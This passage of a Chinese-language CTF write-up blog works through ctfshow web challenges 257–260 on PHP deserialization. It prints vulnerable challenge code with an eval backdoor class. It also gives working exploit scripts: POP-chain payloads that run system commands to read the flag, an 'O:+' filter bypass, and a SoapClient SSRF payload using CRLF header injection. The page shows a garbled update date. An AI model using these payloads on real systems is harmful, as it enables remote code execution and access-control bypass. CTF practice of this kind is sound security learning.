</span></span><span class=line><span class=cl>	<span class=nv>$user </span><span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]);</span>    
</span></span><span class=line><span class=cl>	<span class=nv>$user</span><span class=o>-&gt;</span><span class=na>login</span><span class=p>(</span><span class=nv>$username</span><span class=p>,</span><span class=nv>$password</span><span class=p>);</span>  
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>简单POP链，想要得到 flag 就需要 backDoor 类中的 geInfo 函数，因为其中包含 eval 函数可以进行命令执行，<code>code</code>这个私有属性储存着我们要执行的命令，触发<code>getInfo</code>的方法在<code>ctfShowUser</code>这个类中，所以我们可以利用他的<code>__destruct</code>函数来触发在创建对象时类的<code>__getInfo()</code>函数，通过<code>ctfShowUser</code>的<code>__construct</code>魔术方法来创建<code>backdoor</code>对象</p><pre tabindex=0><code>backdoor::getinfo&lt;--ctfShowUser::__destruct&lt;--ctfShowUser::__construct
</code></pre><p>因为 code 是private属性，所以要进行 urlencode，将不可见字符编码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>  
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ctfShowUser</span><span class=p>{</span>  
</span></span><span class=line><span class=cl><span class=k>private</span> <span class=nv>$username</span><span class=o>=</span><span class=s1>&#39;xxxxxx&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl><span class=k>private</span> <span class=nv>$password</span><span class=o>=</span><span class=s1>&#39;xxxxxx&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl><span class=k>private</span> <span class=nv>$isVip</span><span class=o>=</span><span class=k>true</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$class</span> <span class=o>=</span> <span class=s1>&#39;backDoor&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>  
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>class</span><span class=o>=</span><span class=k>new</span> <span class=nx>backDoor</span><span class=p>();</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl><span class=p>}</span>  
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>backDoor</span><span class=p>{</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$code</span><span class=o>=</span><span class=s1>&#39;system(&#34;tac flag.php&#34;);&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl><span class=p>}</span>  
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=k>new</span> <span class=nx>ctfShowUser</span><span class=p>));</span>
</span></span></code></pre></div><h3 id=web258 class=headerLink><a href=#web258 class=header-mark></a>web258</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ctfShowUser</span><span class=p>{</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$username</span><span class=o>=</span><span class=s1>&#39;xxxxxx&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$password</span><span class=o>=</span><span class=s1>&#39;xxxxxx&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$isVip</span><span class=o>=</span><span class=k>false</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$class </span><span class=o>=</span> <span class=s1>&#39;info&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>class</span><span class=o>=</span><span class=k>new</span> <span class=nx>info</span><span class=p>();</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>login</span><span class=p>(</span><span class=nv>$u</span><span class=p>,</span><span class=nv>$p</span><span class=p>){</span>  
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=o>===</span><span class=nv>$u</span><span class=o>&amp;&amp;</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span><span class=o>===</span><span class=nv>$p</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>class</span><span class=o>-&gt;</span><span class=na>getInfo</span><span class=p>();</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=p>}</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>info</span><span class=p>{</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$user</span><span class=o>=</span><span class=s1>&#39;xxxxxx&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>getInfo</span><span class=p>(){</span>  
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>user</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl><span class=p>}</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>backDoor</span><span class=p>{</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$code</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>getInfo</span><span class=p>(){</span>  
</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>code</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl><span class=p>}</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=nv>$username</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>];</span>  
</span></span><span class=line><span class=cl><span class=nv>$password</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>];</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$username</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$password</span><span class=p>)){</span>  
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/[oc]:\d+:/i&#39;</span><span class=p>,</span> <span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>])){</span>        <span class=nv>$user </span><span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]);</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>    <span class=nv>$user</span><span class=o>-&gt;</span><span class=na>login</span><span class=p>(</span><span class=nv>$username</span><span class=p>,</span><span class=nv>$password</span><span class=p>);</span>  
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>和上一题类似
过滤了 <code>O:数字:</code> <code>C:数字:</code> 的形式, 可以在数字前面加上 <code>+</code> 绕过
然后之前的 private 全部改成 public 了…</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ctfShowUser</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$username</span><span class=o>=</span><span class=s1>&#39;aaa&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$password</span><span class=o>=</span><span class=s1>&#39;bbb&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$class</span> <span class=o>=</span> <span class=s1>&#39;backDoor&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>class</span><span class=o>=</span><span class=k>new</span> <span class=nx>backDoor</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>class</span><span class=o>-&gt;</span><span class=na>getInfo</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>backDoor</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$code</span><span class=o>=</span><span class=s2>&#34;system(&#39;tac f*&#39;);&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>getInfo</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>code</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>ctfShowUser</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span><span class=o>=</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span><span class=o>=</span><span class=nx>str_replace</span><span class=p>(</span><span class=s2>&#34;O:&#34;</span><span class=p>,</span><span class=s2>&#34;O:+&#34;</span><span class=p>,</span><span class=nv>$b</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>PHP_EOL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nv>$b</span><span class=p>);</span>
</span></span></code></pre></div><h3 id=web259 class=headerLink><a href=#web259 class=header-mark></a>web259</h3><p>flag.php</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$xff</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s1>&#39;,&#39;</span><span class=p>,</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=nx>array_pop</span><span class=p>(</span><span class=nv>$xff</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$ip</span> <span class=o>=</span> <span class=nx>array_pop</span><span class=p>(</span><span class=nv>$xff</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$ip</span><span class=o>!==</span><span class=s1>&#39;127.0.0.1&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=k>die</span><span class=p>(</span><span class=s1>&#39;error&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nv>$token</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;token&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nv>$token</span><span class=o>==</span><span class=s1>&#39;ctfshow&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=nx>file_put_contents</span><span class=p>(</span><span class=s1>&#39;flag.txt&#39;</span><span class=p>,</span><span class=nv>$flag</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>index.php</p><pre tabindex=0><code>&lt;?php  
  
highlight_file(__FILE__);  
  
  
$vip = unserialize($_GET[&#39;vip&#39;]);  
//vip can get flag one key  
$vip-&gt;getFlag();
</code></pre><p>通过 flag.php 可知必须本地访问flag.php 而且带上token，第一反应就是改 xff 为 127.0.0.1 但是这个题不行，因为有 cloudfare 代理无法通过本地构造XFF绕过，因此这题需要利用原生类的反序列化来实现SSRF，SoapClient原生类的反序列化，在本题的环境当中，由于使用Cloudflare 代理导致，Cloudflare 会将 HTTP 代理的 IP 地址附加到这个标头，在两次调用array_pop后我们取得的始终是固定的服务器IP</p><p>这里ip因为被pop了两次，所以分割后只剩了127.0.0.1，绕过了flag.php</p><p>poc：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$ua</span><span class=o>=</span><span class=s2>&#34;ctfshow</span><span class=se>\r\n</span><span class=s2>x-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1</span><span class=se>\r\n</span><span class=s2>Content-Type:application/x-www-form-urlencoded</span><span class=se>\r\n</span><span class=s2>Content-Length:13</span><span class=se>\r\n\r\n</span><span class=s2>token=ctfshow&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$client</span><span class=o>=</span><span class=k>new</span> <span class=nx>SoapClient</span><span class=p>(</span><span class=k>null</span><span class=p>,</span><span class=k>array</span><span class=p>(</span><span class=s1>&#39;uri&#39;</span><span class=o>=&gt;</span><span class=s2>&#34;127.0.0.1/&#34;</span><span class=p>,</span><span class=s1>&#39;location&#39;</span><span class=o>=&gt;</span><span class=s2>&#34;http://127.0.0.1/flag.php&#34;</span><span class=p>,</span><span class=s1>&#39;user_agent&#39;</span><span class=o>=&gt;</span><span class=nv>$ua</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$client</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>访问flag.txt，得到flag</p><h3 id=web260 class=headerLink><a href=#web260 class=header-mark></a>web260</h3><p><code>?ctfshow=O:18:"ctfshow_i_love_36D"</code></p><h3 id=web261 class=headerLink><a href=#web261 class=header-mark></a>web261</h3></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 13139-1111-1311</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><button title="分享到 Twitter" data-sharer=twitter data-url=https://nexuzzz0.github.io/posts/wp/ctfshow%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ data-title=Ctfshow做题记录 data-hashtags=ctfshow,wp><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer=facebook data-url=https://nexuzzz0.github.io/posts/wp/ctfshow%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ data-hashtag=ctfshow><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 WhatsApp" data-sharer=whatsapp data-url=https://nexuzzz0.github.io/posts/wp/ctfshow%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ data-title=Ctfshow做题记录 data-web><span class="fab fa-whatsapp fa-fw"></span></button><button title="分享到 Line" data-sharer=line data-url=https://nexuzzz0.github.io/posts/wp/ctfshow%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ data-title=Ctfshow做题记录><span data-svg-src=/lib/simple-icons/icons/line.min.svg></span></button><button title="分享到 微博" data-sharer=weibo data-url=https://nexuzzz0.github.io/posts/wp/ctfshow%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ data-title=Ctfshow做题记录><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Myspace" data-sharer=myspace data-url=https://nexuzzz0.github.io/posts/wp/ctfshow%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ data-title=Ctfshow做题记录 data-description><span data-svg-src=/lib/simple-icons/icons/myspace.min.svg></span></button><button title="分享到 Blogger" data-sharer=blogger data-url=https://nexuzzz0.github.io/posts/wp/ctfshow%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ data-title=Ctfshow做题记录 data-description><span class="fab fa-blogger fa-fw"></span></button><button title="分享到 Evernote" data-sharer=evernote data-url=https://nexuzzz0.github.io/posts/wp/ctfshow%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ data-title=Ctfshow做题记录><span class="fab fa-evernote fa-fw"></span></button></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/ctfshow/>ctfshow</a>,&nbsp;<a href=/tags/wp/>wp</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/python/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%BB%95%E8%BF%87/ class=prev rel=prev title=Python沙盒逃逸绕过><i class="fas fa-angle-left fa-fw"></i>Python沙盒逃逸绕过</a></div></div><div id=comments></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2023 - 2024</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div><div class=footer-line></div><div class=footer-line></div></div></footer></div><div id=fixed-buttons><a href=#back-to-top id=back-to-top-button class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw"></i></a></div><div class=assets><link rel=stylesheet href=/lib/katex/katex.min.css><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/katex/copy-tex.min.css><noscript><link rel=stylesheet href=/lib/katex/copy-tex.min.css></noscript><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:10},comment:{},data:{"desktop-header-typeit":"Nexuzzz0's BLOG","mobile-header-typeit":"Nexuzzz0's BLOG"},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{distance:100,findAllMatches:!1,highlightTag:"em",ignoreFieldNorm:!1,ignoreLocation:!1,isCaseSensitive:!1,location:0,maxResultLength:10,minMatchCharLength:2,noResultsFound:"没有找到结果",snippetLength:50,threshold:.3,useExtendedSearch:!1},sharerjs:!0,table:{sort:!0},typeit:{cursorChar:"|",cursorSpeed:1e3,data:{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},duration:-1,speed:100}}</script><script type=text/javascript src=/lib/tablesort/tablesort.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/sharer/sharer.min.js></script><script type=text/javascript src=/lib/typeit/typeit.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js defer></script><script type=text/javascript src=/lib/katex/auto-render.min.js defer></script><script type=text/javascript src=/lib/katex/copy-tex.min.js defer></script><script type=text/javascript src=/lib/katex/mhchem.min.js defer></script><script type=text/javascript src=/js/katex.min.js defer></script><script type=text/javascript src=/js/theme.min.js defer></script></div></body></html>